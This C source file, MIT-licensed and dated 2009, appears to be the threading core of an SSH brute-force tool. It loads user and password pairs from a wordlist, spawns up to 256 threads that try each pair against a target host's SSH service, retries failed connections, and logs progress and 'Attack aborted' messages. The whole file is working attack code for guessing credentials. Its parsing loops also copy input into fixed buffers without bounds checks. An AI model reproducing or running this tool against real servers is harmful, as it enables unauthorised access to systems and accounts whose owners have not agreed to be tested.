/*
 * MIT License
 *
 * Copyright (c) 2009 Alexandru Dreptu
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include "sshb.h"
#include <errno.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

// external variables
extern int threads;          // main.c
extern char *fuser_password; // main.c

FILE *fptr_user_password;

// thread data
pthread_mutex_t mutex1;
pthread_mutex_t mutex2;
pthread_t thid[256];
typedef struct thread_data {
    float total;        // all login possibilities
    float tries;        // actual tries number
    float failed_tries; // failed tries
} * p_thread_data;

// connect data
char ip[16];
unsigned int port = 22;

// here is thread's main, load passwords and users and call check_ssh_auth()
void *thread(void *param) {
    char line_buffer[256];
    char user[101][32], password[101][32];
    int x = 0, y = 0, z = 0, c = 0;
    struct thread_data *th_data = param;

    while (!feof(fptr_user_password)) {
        // cleaning buffers
        memset(user, 0x00, sizeof(user));
        memset(password, 0x00, sizeof(password));

        // block other threads and load 100 lines from pass file
        pthread_mutex_lock(&mutex1);
        x = 0;
        do {
            memset(line_buffer, 0x00, sizeof(line_buffer));
            // if (fscanf(fptr_user_password, "%s %s", user[x], password[x]) ==
            // EOF) break;
            if (!fgets(line_buffer, sizeof(line_buffer), fptr_user_password))
                break;

            // removing CR LF chars
            for (z = 0; z < strlen(line_buffer); z++) {
                if (line_buffer[z] == '\n' || line_buffer[z] == '\r')
                    line_buffer[z] = 0x00;
            }

            // copy user
            y = 0;
            z = 0;
            do
                user[x][z++] = line_buffer[y++];
            while (line_buffer[y] != ' ' && line_buffer[y] != '\0');

            // copy passwd
            z = 0;
            y++;
            do
                password[x][z++] = line_buffer[y++];
            while (line_buffer[y] != '\0');
            x++;
        } while (!feof(fptr_user_password) && x != 100);
        pthread_mutex_unlock(&mutex1);

        // login loop, counters, etc
        x = 0;
        while (user[x][0] && password[x][0]) {
        again:
            switch (check_ssh_auth(user[x], password[x], ip, port)) {

            // couldn't connect
            case 0:
                // retry login for 16 times, then abort and exit
                if (th_data->failed_tries == 16) {
                    log_printf(LOG_FILE, "Attack aborted [%s:%d]\n", ip, port);
                    return 0;
                }
                th_data->failed_tries++;
                sleep(5);
                goto again;

            // connected
            default:
                // reset tries
                th_data->failed_tries = 0;
                break;
            }

            // count and print progress
            c++;
            if (c == 100) {
                pthread_mutex_lock(&mutex2);
                th_data->tries += c;
                log_stat("%s [%0.2f%% done]", ip,
                         (th_data->tries / th_data->total) * 100);
                pthread_mutex_unlock(&mutex2);
                c = 0;
            }
            x++;
        }
    }

    // at last write 100.00% progress
    pthread_mutex_lock(&mutex2);
    th_data->tries += c;
    log_stat("%s [%0.2f%% done]", ip, (th_data->tries / th_data->total) * 100);
    pthread_mutex_unlock(&mutex2);

    debugf("# feof(fptr_user_password)\n");
    return 0;
}

/*
 * from here, the fork is starting, opening pass && user
 * file, creating threads, etc.
 */
void fork_main(char *opt) {
    int x = 0, y = 0;
    char c_port[8], buff[64];
    struct thread_data th_data;

    /* fill up buffer/struct with null chars */
    memset(ip, 0x00, sizeof(ip));
    memset(&th_data, 0x00, sizeof(struct thread_data));

    // get ip
    do {
        ip[y] = opt[x];
        x++;
        y++;
        /*
         * FIXME: separator check if(opt[x] != ':') {
         * fprintf(stderr, "Incorrect separator, must be ':'\n");
         * exit(-1);
         * }
         */
    } while (opt[x] != ':' && opt[x] != '\0');

    // get port
    if (opt[x] == ':' && opt[x + 1]) {
        y = 0;
        x++;
        do {
            c_port[y] = opt[x];
            y++;
            x++;
        } while (opt[x] != '\0');
        port = atoi(c_port);
    }

    fptr_user_password = fopen(fuser_password, "rt");
    if (!fptr_user_password) fatal("no pass file: ", errno);

    while (!feof(fptr_user_password)) {
        if (fgets(buff, sizeof(buff), fptr_user_password)) th_data.total++;
    }
    fseek(fptr_user_password, 0L, SEEK_SET);

    // threads mutexes initialization
    pthread_mutex_init(&mutex1, 0);
    pthread_mutex_init(&mutex2, 0);

    // check if there's a true ssh daemon
    if (!check_if_ssh(ip, port)) {
        log_printf(LOG_FILE, "Abort: %s:%d !have sshd\n", ip, port);
        goto exit;
    }

    // print 0% progress
    log_stat("%s [%0.2f%% done]", ip, (th_data.tries / th_data.total) * 100);

    /*
     * FIXME:
     * I cannot understand why on some old linux systems,
     * pthread_create() spawns some forks, therefore
     * int threads = 0 by default.
     */
    if (threads == 0 || threads == 1) {
        (void *)thread((void *)&th_data);
        goto exit;
    }

    for (x = 0; x < threads; x++) {
        if (pthread_create(&thid[x], 0, thread, (void *)&th_data)) {
            perror("Cannot create thread");
            break;
        }
    }

    debugf("# %d threads created\n", x);

    // waiting threads
    for (x = 0; x < threads; x++) { pthread_join(thid[x], 0); }

exit:
    // destroy thread's mutex
    pthread_mutex_destroy(&mutex1);
    pthread_mutex_destroy(&mutex2);

    // closing file pointer
    if (fptr_user_password) fclose(fptr_user_password);
}
